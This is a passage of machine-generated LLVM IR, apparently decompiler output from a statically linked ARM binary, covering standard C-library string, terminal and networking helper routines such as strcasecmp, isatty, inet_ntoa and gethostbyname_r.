  %v0_143b8 = load i32, i32* @r8, align 4
  %v2_143b8 = icmp eq i32 %v0_143b8, 0
  %v1_143bc = add i32 %v3_143b4, 1
  store i32 %v1_143bc, i32* @r4, align 4
  br i1 %v2_143b8, label %bb27, label %dec_label_pc_143b0._crit_edge

dec_label_pc_143b0._crit_edge:                    ; preds = %dec_label_pc_143b0
  %v1_143c4.pre = load i32, i32* @r6, align 4
  br label %bb28

bb27:                                             ; preds = %dec_label_pc_143b0
  br label %bb28

bb28:                                             ; preds = %dec_label_pc_143b0._crit_edge, %bb27
  %v4_143c8 = phi i32 [ %v1_143c4.pre, %dec_label_pc_143b0._crit_edge ], [ 0, %bb27 ]
  %tmp56 = icmp ugt i32 %v1_143bc, %v4_143c8
  br i1 %tmp56, label %bb29, label %.thread16

bb29:                                             ; preds = %bb28
  store i32 %v4_143c8, i32* @r4, align 4
  store i32 34, i32* %r7.global-to-local, align 4
  br label %.thread16

.thread16:                                        ; preds = %bb28, %bb29
  %v0_143d814 = phi i32 [ %v4_143c8, %bb29 ], [ %v1_143bc, %bb28 ]
  %v2_143d0 = icmp eq i32 %v0_143d814, 0
  br i1 %v2_143d0, label %dec_label_pc_143f4, label %dec_label_pc_143d8

dec_label_pc_143d8:                               ; preds = %.thread16
  store i32 %v0_143d814, i32* @r2, align 4
  %v0_143dc = load i32, i32* @r5, align 4
  store i32 %v0_143dc, i32* @r1, align 4
  store i32 %v0_143b8, i32* @r0, align 4
  %v0_143e4 = call i32 @memcpy()
  %v0_143e8 = load i32, i32* @r8, align 4
  %v1_143e8 = load i32, i32* @r4, align 4
  %v2_143e8 = add i32 %v1_143e8, %v0_143e8
  %v3_143f0 = add i32 %v2_143e8, -1
  %v4_143f0 = inttoptr i32 %v3_143f0 to i8*
  store i8 0, i8* %v4_143f0, align 1
  br label %dec_label_pc_143f4

dec_label_pc_143f4:                               ; preds = %.thread16, %dec_label_pc_143d8
  %v0_143f4 = load i32, i32* %r7.global-to-local, align 4
  %v2_143f4 = icmp eq i32 %v0_143f4, 0
  br i1 %v2_143f4, label %dec_label_pc_14404, label %dec_label_pc_143fc

dec_label_pc_143fc:                               ; preds = %dec_label_pc_143f4
  %v0_143fc = call i32 @__errno_location()
  %v0_14400 = load i32, i32* %r7.global-to-local, align 4
  %v2_14400 = inttoptr i32 %v0_143fc to i32*
  store i32 %v0_14400, i32* %v2_14400, align 4
  %v0_14404.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_14404

dec_label_pc_14404:                               ; preds = %dec_label_pc_143f4, %dec_label_pc_143fc
  %v0_14404 = phi i32 [ 0, %dec_label_pc_143f4 ], [ %v0_14404.pre, %dec_label_pc_143fc ]
  store i32 %v3_14330, i32* @r4, align 4
  ret i32 %v0_14404

; uselistorder directives
  uselistorder i32 %v4_143c8, { 1, 2, 0 }
  uselistorder i32 %v1_143bc, { 1, 0, 2 }
  uselistorder i32 %v1_1435c, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_14334, { 4, 3, 1, 2, 0 }
  uselistorder i32* %r7.global-to-local, { 4, 3, 2, 0, 1, 5 }
  uselistorder label %dec_label_pc_14404, { 1, 0 }
  uselistorder label %dec_label_pc_143f4, { 1, 0 }
  uselistorder label %.thread16, { 1, 0 }
  uselistorder label %bb28, { 1, 0 }
  uselistorder label %dec_label_pc_143b0, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
}

define i32 @__GI_strcasecmp(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @lr, align 4
  br label %dec_label_pc_14428

dec_label_pc_14428:                               ; preds = %bb8, %entry
  %v8_1448c3 = phi i32 [ %v8_1448c, %bb8 ], [ 0, %entry ]
  %v0_14480 = phi i32 [ %v1_14480, %bb8 ], [ %arg2, %entry ]
  %v0_14484 = phi i32 [ %v1_14484, %bb8 ], [ %tmp, %entry ]
  %v9_14428 = icmp eq i32 %v0_14484, %v0_14480
  br i1 %v9_14428, label %dec_label_pc_14428._crit_edge, label %dec_label_pc_14430

dec_label_pc_14428._crit_edge:                    ; preds = %dec_label_pc_14428
  %.pre = inttoptr i32 %v0_14480 to i8*
  br label %bb8

dec_label_pc_14430:                               ; preds = %dec_label_pc_14428
  %v1_14434 = inttoptr i32 %v0_14484 to i8*
  %v2_14434 = load i8, i8* %v1_14434, align 1
  %v3_14434 = zext i8 %v2_14434 to i32
  %v1_14438 = inttoptr i32 %v0_14480 to i8*
  %v2_14438 = load i8, i8* %v1_14438, align 1
  %v3_14438 = zext i8 %v2_14438 to i32
  %v2_1443c = load i32, i32* bitcast (i32** @global_var_2c8c8.1116 to i32*), align 4
  %v2_14440 = mul nuw nsw i32 %v3_14434, 2
  %v2_14444 = mul nuw nsw i32 %v3_14438, 2
  %v2_14448 = add i32 %v2_14444, %v2_1443c
  %v2_1444c = add i32 %v2_1443c, %v2_14440
  %v1_14450 = add i32 %v2_1444c, 1
  %v2_14450 = inttoptr i32 %v1_14450 to i8*
  %v3_14450 = load i8, i8* %v2_14450, align 1
  %v4_14450 = zext i8 %v3_14450 to i32
  %v1_14454 = add i32 %v2_14448, 1
  %v2_14454 = inttoptr i32 %v1_14454 to i8*
  %v3_14454 = load i8, i8* %v2_14454, align 1
  %v4_14454 = zext i8 %v3_14454 to i32
  %v3_14458 = inttoptr i32 %v2_14448 to i8*
  %v4_14458 = load i8, i8* %v3_14458, align 1
  %v6_14458 = zext i8 %v4_14458 to i32
  %v3_1445c = inttoptr i32 %v2_1444c to i8*
  %v4_1445c = load i8, i8* %v3_1445c, align 1
  %v6_1445c = zext i8 %v4_1445c to i32
  %v3_14460 = mul nuw i32 %v4_14454, 16777216
  %v3_14464 = mul nuw i32 %v4_14450, 16777216
  %v4_14468 = sdiv i32 %v3_14464, 65536
  %v5_14468 = or i32 %v6_1445c, %v4_14468
  %v4_1446c = sdiv i32 %v3_14460, 65536
  %v5_1446c = or i32 %v4_1446c, %v6_14458
  %v2_14470 = sub nsw i32 %v5_14468, %v5_1446c
  %v9_14470 = icmp eq i32 %v5_14468, %v5_1446c
  br i1 %v9_14470, label %bb8, label %bb

bb:                                               ; preds = %dec_label_pc_14430
  ret i32 %v2_14470

bb8:                                              ; preds = %dec_label_pc_14428._crit_edge, %dec_label_pc_14430
  %v1_14478.pre-phi = phi i8* [ %.pre, %dec_label_pc_14428._crit_edge ], [ %v1_14434, %dec_label_pc_14430 ]
  %v8_1448c = phi i32 [ %v8_1448c3, %dec_label_pc_14428._crit_edge ], [ %v2_14470, %dec_label_pc_14430 ]
  %v2_14478 = load i8, i8* %v1_14478.pre-phi, align 1
  %v2_1447c = icmp eq i8 %v2_14478, 0
  %v1_14480 = add i32 %v0_14480, 1
  %v1_14484 = add i32 %v0_14484, 1
  store i32 %v1_14484, i32* @lr, align 4
  br i1 %v2_1447c, label %dec_label_pc_1448c, label %dec_label_pc_14428

dec_label_pc_1448c:                               ; preds = %bb8
  ret i32 %v8_1448c

; uselistorder directives
  uselistorder i32 %v1_14484, { 1, 0 }
  uselistorder i32 %v2_14470, { 1, 0 }
  uselistorder i32 %v5_1446c, { 1, 0 }
  uselistorder i32 %v5_14468, { 1, 0 }
  uselistorder i32 %v0_14480, { 1, 2, 0, 3 }
  uselistorder label %bb8, { 1, 0 }
}

define i32 @strcasestr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v1_144a816 = inttoptr i32 %arg2 to i8*
  br label %dec_label_pc_144a8.outer

dec_label_pc_144a8.outer:                         ; preds = %dec_label_pc_14510, %entry
  %v0_144bc.ph = phi i32 [ %v1_14510, %dec_label_pc_14510 ], [ %tmp, %entry ]
  %v2_144a817 = load i8, i8* %v1_144a816, align 1
  %v2_144ac19 = icmp eq i8 %v2_144a817, 0
  br i1 %v2_144ac19, label %dec_label_pc_144bc, label %dec_label_pc_144c4

dec_label_pc_144bc:                               ; preds = %dec_label_pc_144a8.backedge, %dec_label_pc_144a8.outer
  ret i32 %v0_144bc.ph

dec_label_pc_144c4:                               ; preds = %dec_label_pc_144a8.outer, %dec_label_pc_144a8.backedge
  %v1_144b425.in = phi i32 [ %v1_144b425, %dec_label_pc_144a8.backedge ], [ %arg2, %dec_label_pc_144a8.outer ]
  %v2_144a823 = phi i8 [ %v2_144a8, %dec_label_pc_144a8.backedge ], [ %v2_144a817, %dec_label_pc_144a8.outer ]
  %v2_144b024.in.in = phi i8 [ %v2_144a8, %dec_label_pc_144a8.backedge ], [ %v2_144a817, %dec_label_pc_144a8.outer ]
  %v0_144cc22 = phi i32 [ %v1_144cc, %dec_label_pc_144a8.backedge ], [ %v0_144bc.ph, %dec_label_pc_144a8.outer ]
  %v1_144b425 = add i32 %v1_144b425.in, 1
  %v1_144c4 = inttoptr i32 %v0_144cc22 to i8*
  %v2_144c4 = load i8, i8* %v1_144c4, align 1
  %v9_144c8 = icmp eq i8 %v2_144a823, %v2_144c4
  %v1_144cc = add i32 %v0_144cc22, 1
  br i1 %v9_144c8, label %dec_label_pc_144a8.backedge, label %dec_label_pc_144d8

dec_label_pc_144a8.backedge:                      ; preds = %dec_label_pc_144c4, %dec_label_pc_144d8
  %v1_144a8 = inttoptr i32 %v1_144b425 to i8*
  %v2_144a8 = load i8, i8* %v1_144a8, align 1
  %v2_144ac = icmp eq i8 %v2_144a8, 0
  br i1 %v2_144ac, label %dec_label_pc_144bc, label %dec_label_pc_144c4

dec_label_pc_144d8:                               ; preds = %dec_label_pc_144c4
  %v2_144b024.in = zext i8 %v2_144b024.in.in to i32
  %v3_144c4 = zext i8 %v2_144c4 to i32
  %v2_144d0 = mul nuw nsw i32 %v3_144c4, 2
  %v2_144b024 = mul nuw nsw i32 %v2_144b024.in, 2
  %v2_144dc = load i32, i32* bitcast (i32** @global_var_2c8c8.1116 to i32*), align 4
  %v2_144e0 = add i32 %v2_144dc, %v2_144d0
  %v2_144e4 = add i32 %v2_144dc, %v2_144b024
  %v1_144e8 = add i32 %v2_144e4, 1
  %v2_144e8 = inttoptr i32 %v1_144e8 to i8*
  %v3_144e8 = load i8, i8* %v2_144e8, align 1
  %v4_144e8 = zext i8 %v3_144e8 to i32
  %v1_144ec = add i32 %v2_144e0, 1
  %v2_144ec = inttoptr i32 %v1_144ec to i8*
  %v3_144ec = load i8, i8* %v2_144ec, align 1
  %v4_144ec = zext i8 %v3_144ec to i32
  %v3_144f0 = inttoptr i32 %v2_144e0 to i8*
  %v4_144f0 = load i8, i8* %v3_144f0, align 1
  %v6_144f0 = zext i8 %v4_144f0 to i32
  %v3_144f4 = inttoptr i32 %v2_144e4 to i8*
  %v4_144f4 = load i8, i8* %v3_144f4, align 1
  %v6_144f4 = zext i8 %v4_144f4 to i32
  %v3_144f8 = mul nuw i32 %v4_144e8, 16777216
  %v3_144fc = mul nuw i32 %v4_144ec, 16777216
  %v4_14500 = sdiv i32 %v3_144f8, 65536
  %v5_14500 = or i32 %v6_144f4, %v4_14500
  %v4_14504 = sdiv i32 %v3_144fc, 65536
  %v5_14504 = or i32 %v4_14504, %v6_144f0
  %v9_14508 = icmp eq i32 %v5_14500, %v5_14504
  br i1 %v9_14508, label %dec_label_pc_144a8.backedge, label %dec_label_pc_14510

dec_label_pc_14510:                               ; preds = %dec_label_pc_144d8
  %v1_14510 = add i32 %v0_144bc.ph, 1
  %v2_14514 = icmp eq i8 %v2_144c4, 0
  br i1 %v2_14514, label %dec_label_pc_14524, label %dec_label_pc_144a8.outer

dec_label_pc_14524:                               ; preds = %dec_label_pc_14510
  ret i32 0

; uselistorder directives
  uselistorder i8 %v2_144a8, { 2, 1, 0 }
  uselistorder i8 %v2_144c4, { 0, 2, 1 }
  uselistorder i32 %v0_144cc22, { 1, 0 }
  uselistorder i32 %v0_144bc.ph, { 2, 0, 1 }
  uselistorder label %dec_label_pc_144a8.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_144c4, { 1, 0 }
}

define i32 @__GI_strtok(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_32930.1119 to i32), i32* @r2, align 4
  %v0_14534 = call i32 @strtok_r()
  %v0_14538 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14538, label %bb, label %bb1

bb:                                               ; preds = %entry
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  ret i32 %v0_14534

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-64 = alloca i32, align 4
  %v2_14540 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_14540, i32* @r1, align 4
  %v0_14548 = call i32 @__GI_tcgetattr()
  %v1_1454c = sub i32 1, %v0_14548
  %v2_1454c = icmp ult i32 %v0_14548, 2
  br i1 %v2_1454c, label %bb4, label %bb

bb:                                               ; preds = %entry
  br label %bb4

bb4:                                              ; preds = %entry, %bb
  %v5_14558 = phi i32 [ %v1_1454c, %entry ], [ 0, %bb ]
  ret i32 %v5_14558

; uselistorder directives
  uselistorder i32 %v0_14548, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__GI_tcgetattr() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_2()
  %stack_var_-39 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_1455c = load i32, i32* @r4, align 4
  %v6_1455c = load i32, i32* @r5, align 4
  %v2_14560 = ptrtoint i32* %stack_var_-56 to i32
  %v0_14564 = load i32, i32* @r1, align 4
  store i32 %v0_14564, i32* %r6.global-to-local, align 4
  %v0_14570 = load i32, i32* @r0, align 4
  %v3_14570 = call i32 @ioctl(i32 %v0_14570, i32 21505, i32 %v2_14560)
  store i32 %v3_14570, i32* %r7.global-to-local, align 4
  %v2_14574 = icmp eq i32 %v3_14570, 0
  %v2_1457c = ptrtoint i32* %stack_var_-39 to i32
  store i32 %v2_1457c, i32* @r1, align 4
  %v0_14584 = load i32, i32* %r6.global-to-local, align 4
  br i1 %v2_14574, label %dec_label_pc_1458c, label %dec_label_pc_145b8

dec_label_pc_1458c:                               ; preds = %entry
  %v1_14584 = add i32 %v0_14584, 17
  %v4_14594 = zext i8 %tmp to i32
  store i32 %v4_14594, i32* @r5, align 4
  %v2_14598 = load i32, i32* %stack_var_-56, align 4
  %v1_1459c = inttoptr i32 %v0_14584 to i32*
  store i32 %v2_14598, i32* %v1_1459c, align 4
  %v3_1459c = add i32 %v0_14584, 4
  %v4_1459c = inttoptr i32 %v3_1459c to i32*
  %v5_1459c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_1459c, i32* %v4_1459c, align 4
  %v6_1459c = add i32 %v0_14584, 8
  %v7_1459c = inttoptr i32 %v6_1459c to i32*
  %v8_1459c = load i32, i32* @lr, align 4
  store i32 %v8_1459c, i32* %v7_1459c, align 4
  %v0_145a0 = load i32, i32* @r4, align 4
  %v1_145a0 = load i32, i32* %r6.global-to-local, align 4
  %v2_145a0 = add i32 %v1_145a0, 12
  %v3_145a0 = inttoptr i32 %v2_145a0 to i32*
  store i32 %v0_145a0, i32* %v3_145a0, align 4
  %v0_145a4 = load i32, i32* @r5, align 4
  %v1_145a4 = trunc i32 %v0_145a4 to i8
  %v2_145a4 = load i32, i32* %r6.global-to-local, align 4
  %v3_145a4 = add i32 %v2_145a4, 16
  %v4_145a4 = inttoptr i32 %v3_145a4 to i8*
  store i8 %v1_145a4, i8* %v4_145a4, align 1
  %v4_145a8 = call i32 @__GI_mempcpy(i32 %v1_14584, i32 %v2_1457c, i32 19, i32 %v2_14598)
  %v0_145ac = load i32, i32* %r7.global-to-local, align 4
  store i32 13, i32* @r2, align 4
  %v2_145b4 = inttoptr i32 %v4_145a8 to i8*
  %v3_145b4 = call i32 @__GI_memset(i8* %v2_145b4, i32 %v0_145ac)
  br label %dec_label_pc_145b8

dec_label_pc_145b8:                               ; preds = %entry, %dec_label_pc_1458c
  %v0_145b8 = phi i32 [ %v3_14570, %entry ], [ %v0_145ac, %dec_label_pc_1458c ]
  store i32 %v3_1455c, i32* @r4, align 4
  store i32 %v6_1455c, i32* @r5, align 4
  ret i32 %v0_145b8

; uselistorder directives
  uselistorder i32 %v0_14584, { 2, 1, 0, 3 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 0, 2, 1 }
  uselistorder label %dec_label_pc_145b8, { 1, 0 }
}

define i32 @ntohl(i32 %arg1) local_unnamed_addr {
entry:
  %v2_145e4 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v2_145e4
}

define i32 @ntohs(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = mul i32 %arg1, 256
  %v1_145f4 = and i32 %tmp, 65280
  %tmp1 = udiv i32 %arg1, 256
  %v4_145f8 = urem i32 %tmp1, 256
  %v5_145f8 = or i32 %v4_145f8, %v1_145f4
  ret i32 %v5_145f8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @htonl(i32 %arg1) local_unnamed_addr {
entry:
  %v2_1461c = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v2_1461c
}

define i32 @htons(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = mul i32 %arg1, 256
  %v1_1462c = and i32 %tmp, 65280
  %tmp1 = udiv i32 %arg1, 256
  %v4_14630 = urem i32 %tmp1, 256
  %v5_14630 = or i32 %v4_14630, %v1_1462c
  ret i32 %v5_14630

; uselistorder directives
  uselistorder i32 65280, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__GI_inet_ntoa_r() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %v3_14638 = load i32, i32* @r4, align 4
  %v6_14638 = load i32, i32* @r5, align 4
  %v9_14638 = load i32, i32* @r6, align 4
  %v0_1463c = load i32, i32* @r0, align 4
  %v2_1465c = call i32 @llvm.bswap.i32(i32 %v0_1463c)
  %v0_14660 = load i32, i32* @r1, align 4
  %v1_14660 = add i32 %v0_14660, 15
  store i32 %v1_14660, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1468c

dec_label_pc_1466c:                               ; preds = %dec_label_pc_1468c
  %v1_14690 = urem i32 %v0_146a0, 256
  store i32 0, i32* %ip.global-to-local, align 4
  %v5_14674 = inttoptr i32 %v0_146ac to i8*
  %v6_14674 = call i32 @_uintmaxtostr(i8* %v5_14674, i32 %v1_14690, i32 0, i32 -10, i32 0)
  %v0_14678 = load i32, i32* @r6, align 4
  %v2_14678 = icmp eq i32 %v0_14678, 0
  %v1_1467c = add i32 %v6_14674, -1
  store i32 %v1_1467c, i32* %ip.global-to-local, align 4
  br i1 %v2_14678, label %dec_label_pc_1468c.backedge, label %bb

dec_label_pc_1468c.backedge:                      ; preds = %bb, %dec_label_pc_1466c
  %storemerge.pre = phi i32 [ %storemerge.pre.pre, %bb ], [ %v1_1467c, %dec_label_pc_1466c ]
  %v0_1468c.pre = load i32, i32* @r5, align 4
  %v0_14690.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1468c

bb:                                               ; preds = %dec_label_pc_1466c
  %v4_14684 = inttoptr i32 %v0_14678 to i8*
  store i8 46, i8* %v4_14684, align 1
  %storemerge.pre.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1468c.backedge

dec_label_pc_1468c:                               ; preds = %dec_label_pc_1468c.backedge, %entry
  %v0_146ac = phi i32 [ %v1_14660, %entry ], [ %storemerge.pre, %dec_label_pc_1468c.backedge ]
  %storemerge = phi i32 [ 0, %entry ], [ %storemerge.pre, %dec_label_pc_1468c.backedge ]
  %v0_146a0 = phi i32 [ %v2_1465c, %entry ], [ %v0_14690.pre, %dec_label_pc_1468c.backedge ]
  %v0_146a4 = phi i32 [ 0, %entry ], [ %v0_1468c.pre, %dec_label_pc_1468c.backedge ]
  store i32 %storemerge, i32* @r6, align 4
  %v7_1468c = icmp eq i32 %v0_146a4, 3
  store i1 %v7_1468c, i1* @cpsr_z, align 1
  %v3_146a0 = udiv i32 %v0_146a0, 256
  store i32 %v3_146a0, i32* @r4, align 4
  %v1_146a4 = add i32 %v0_146a4, 1
  store i32 %v1_146a4, i32* @r5, align 4
  %v7_146a8 = icmp sgt i32 %v0_146a4, 3
  br i1 %v7_146a8, label %dec_label_pc_146ac, label %dec_label_pc_1466c

dec_label_pc_146ac:                               ; preds = %dec_label_pc_1468c
  %v1_146ac = add i32 %v0_146ac, 1
  store i32 %v3_14638, i32* @r4, align 4
  store i32 %v6_14638, i32* @r5, align 4
  store i32 %v9_14638, i32* @r6, align 4
  ret i32 %v1_146ac

; uselistorder directives
  uselistorder i32 %v0_146a4, { 2, 0, 1 }
  uselistorder i32 (i8*, i32, i32, i32, i32)* @_uintmaxtostr, { 2, 1, 0 }
}

define i32 @__GI_inet_ntoa(i32 %arg1) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_32934.1122 to i32), i32* @r1, align 4
  %v0_146bc = call i32 @__GI_inet_ntoa_r()
  %v0_146c0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_146c0, label %bb, label %bb1

bb:                                               ; preds = %entry
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  ret i32 %v0_146bc

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_146c8 = ptrtoint i32* %stack_var_-8 to i32
  %v0_146d0 = load i32, i32* @r0, align 4
  %v2_146d0 = inttoptr i32 %v0_146d0 to i8*
  %v3_146d0 = call i32 @inet_aton(i8* %v2_146d0, i32 %v2_146c8)
  %v2_146d4 = icmp eq i32 %v3_146d0, 0
  br i1 %v2_146d4, label %bb4, label %bb

bb:                                               ; preds = %entry
  %v3_146dc = load i32, i32* %stack_var_-8, align 4
  br label %bb4

bb4:                                              ; preds = %entry, %bb
  %v5_146e4 = phi i32 [ -1, %entry ], [ %v3_146dc, %bb ]
  ret i32 %v5_146e4

; uselistorder directives
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__GI_gethostbyname(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v3_146e8 = load i32, i32* @r4, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_146f4 = call i32 @__GI___h_errno_location()
  %v2_146f8 = ptrtoint i32* %stack_var_-12 to i32
  %v0_14704 = load i32, i32* @r4, align 4
  %v7_14714 = call i32 @gethostbyname_r(i32 %v0_14704, i32* nonnull @global_var_32b10.1124, i32 ptrtoint (i32* @global_var_32944.1126 to i32), i32 460, i32 %v2_146f8, i32 %v0_146f4)
  %v3_14718 = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_146e8, i32* @r4, align 4
  ret i32 %v3_14718
}

define i32 @gethostbyname_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v6_1472c = load i32, i32* @r5, align 4
  %v9_1472c = load i32, i32* @r6, align 4
  %v12_1472c = load i32, i32* @r7, align 4
  %v15_1472c = load i32, i32* @r8, align 4
  %v18_1472c = load i32, i32* @sb, align 4
  %v21_1472c = load i32, i32* @sl, align 4
  %v24_1472c = load i32, i32* @fp, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg5, i32* %r2.global-to-local, align 4
  %v0_1473c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1473c, i32* @fp, align 4
  %v2_1473c = icmp eq i32 %v0_1473c, 0
  store i32 0, i32* @r6, align 4
  store i32 %tmp, i32* @sl, align 4
  store i32 %arg4, i32* @r4, align 4
  %v2_1474c = inttoptr i32 %arg5 to i32*
  store i32 0, i32* %v2_1474c, align 4
  br i1 %v2_1473c, label %bb, label %dec_label_pc_14758

bb:                                               ; preds = %entry
  %v1_14750 = load i32, i32* %r0.global-to-local, align 4
  %v2_14750 = add i32 %v1_14750, 22
  store i32 %v2_14750, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14a7c

dec_label_pc_14758:                               ; preds = %entry
  %v0_14758 = call i32 @__errno_location()
  store i32 %v0_14758, i32* %r0.global-to-local, align 4
  %v3_1475c = load i32, i32* %stack_var_0, align 4
  store i32 %v3_1475c, i32* %ip.global-to-local, align 4
  %v1_14760 = inttoptr i32 %v0_14758 to i32*
  %v2_14760 = load i32, i32* %v1_14760, align 4
  store i32 %v2_14760, i32* @r8, align 4
  %v0_14764 = load i32, i32* @r6, align 4
  store i32 %v0_14764, i32* %v1_14760, align 4
  %v0_14768 = load i32, i32* %ip.global-to-local, align 4
  store i32 %arg6, i32* %ip.global-to-local, align 4
  store i32 %v0_14758, i32* @r5, align 4
  %v0_14778 = load i32, i32* @fp, align 4
  store i32 %v0_14778, i32* %r0.global-to-local, align 4
  %v0_1477c = load i32, i32* @sl, align 4
  store i32 %v0_1477c, i32* %r2.global-to-local, align 4
  %v0_14780 = load i32, i32* @r7, align 4
  store i32 %v0_14780, i32* %r3.global-to-local, align 4
  %v0_14784 = load i32, i32* @r4, align 4
  %v7_1478c = call i32 @__get_hosts_byname_r(i32 %v0_14778, i32 2, i32 %v0_1477c, i32 %v0_14780, i32 %v0_14784, i32 %v0_14768, i32 %arg6)
  store i32 %v7_1478c, i32* %r0.global-to-local, align 4
  %v2_14790 = icmp eq i32 %v7_1478c, 0
  br i1 %v2_14790, label %dec_label_pc_14a7c, label %dec_label_pc_14798

dec_label_pc_14798:                               ; preds = %dec_label_pc_14758
  store i32 %arg6, i32* %r2.global-to-local, align 4
  %v1_1479c = inttoptr i32 %arg6 to i32*
  %v2_1479c = load i32, i32* %v1_1479c, align 4
  store i32 %v2_1479c, i32* %r3.global-to-local, align 4
  %v7_147a0 = icmp eq i32 %v2_1479c, 1
  br i1 %v7_147a0, label %dec_label_pc_147c4, label %dec_label_pc_147a8

dec_label_pc_147a8:                               ; preds = %dec_label_pc_14798
  %v7_147a8 = icmp eq i32 %v2_1479c, 4
  br i1 %v7_147a8, label %dec_label_pc_147c4, label %dec_label_pc_147b0

dec_label_pc_147b0:                               ; preds = %dec_label_pc_147a8
  %v3_147b0 = icmp eq i32 %v2_1479c, -1
  br i1 %v3_147b0, label %dec_label_pc_147b8, label %dec_label_pc_14a7c

dec_label_pc_147b8:                               ; preds = %dec_label_pc_147b0
  %v0_147b8 = load i32, i32* @r5, align 4
  %v1_147b8 = inttoptr i32 %v0_147b8 to i32*
  %v2_147b8 = load i32, i32* %v1_147b8, align 4
  store i32 %v2_147b8, i32* %r3.global-to-local, align 4
  %v7_147bc = icmp eq i32 %v2_147b8, 2
  br i1 %v7_147bc, label %dec_label_pc_147c4, label %dec_label_pc_14a7c

dec_label_pc_147c4:                               ; preds = %dec_label_pc_147b8, %dec_label_pc_147a8, %dec_label_pc_14798
  %v0_147c4 = load i32, i32* @r7, align 4
  %v1_147c4 = sub i32 0, %v0_147c4
  %v1_147c8 = urem i32 %v1_147c4, 4
  store i32 %v1_147c8, i32* %r3.global-to-local, align 4
  %v2_147c8 = icmp eq i32 %v1_147c8, 0
  %v0_147cc = load i32, i32* @r8, align 4
  %v1_147cc = load i32, i32* @r5, align 4
  %v2_147cc = inttoptr i32 %v1_147cc to i32*
  store i32 %v0_147cc, i32* %v2_147cc, align 4
  %v0_147ec.pre = load i32, i32* @r4, align 4
  br i1 %v2_147c8, label %dec_label_pc_147e4, label %dec_label_pc_147d4

dec_label_pc_147d4:                               ; preds = %dec_label_pc_147c4
  %v1_147d4 = load i32, i32* %r3.global-to-local, align 4
  %v2_147d4 = sub i32 %v0_147ec.pre, %v1_147d4
  %v3_147d4 = icmp ult i32 %v0_147ec.pre, %v1_147d4
  br i1 %v3_147d4, label %dec_label_pc_14a78, label %dec_label_pc_147dc

dec_label_pc_147dc:                               ; preds = %dec_label_pc_147d4
  store i32 %v2_147d4, i32* @r4, align 4
  %v0_147e0 = load i32, i32* @r7, align 4
  %v2_147e0 = add i32 %v0_147e0, %v1_147d4
  store i32 %v2_147e0, i32* @r7, align 4
  br label %dec_label_pc_147e4

dec_label_pc_147e4:                               ; preds = %dec_label_pc_147c4, %dec_label_pc_147dc
  %v0_147ec = phi i32 [ %v2_147d4, %dec_label_pc_147dc ], [ %v0_147ec.pre, %dec_label_pc_147c4 ]
  store i32 %arg6, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  store i32 -1, i32* %v1_1479c, align 4
  %tmp31 = icmp ult i32 %v0_147ec, 4
  br i1 %tmp31, label %dec_label_pc_14a78, label %dec_label_pc_147f8

dec_label_pc_147f8:                               ; preds = %dec_label_pc_147e4
  %v0_147f8 = load i32, i32* @r4, align 4
  %v1_147f8 = add i32 %v0_147f8, -4
  store i32 %v1_147f8, i32* %r3.global-to-local, align 4
  %tmp32 = icmp ult i32 %v1_147f8, 8
